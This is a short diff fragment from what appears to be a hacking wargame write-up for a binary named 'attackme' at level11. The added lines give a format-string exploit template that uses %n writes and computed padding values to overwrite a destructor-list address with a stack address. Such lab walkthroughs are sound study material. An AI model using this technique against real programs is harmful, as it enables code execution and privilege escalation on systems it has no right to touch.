@@ -60,5 +60,15 @@ Idx Name          Size      VMA       LMA       File off  Algn
 
 __DOTR-List's address is 0x08049594 which I will exploit with this.
 
+The attack code format   
+`/home/level11/attackme $(printf "AAAAAddress1BBBBAddress2")%8x%8x%8x%Value1c%n%Value2c%n`
+
+Address1 :   
+Address2(Address+1) : 
+
+0xbffff49d will be (Value2/Value1) cuz this will be inverted when you input   
+Value1 : f49d - 40 = 62621(f49d) - 40 = 62581   
+Value2 : 1bfff-f49d = 114687(1bfff) - 62621(f49d) = 52066
+
 
 
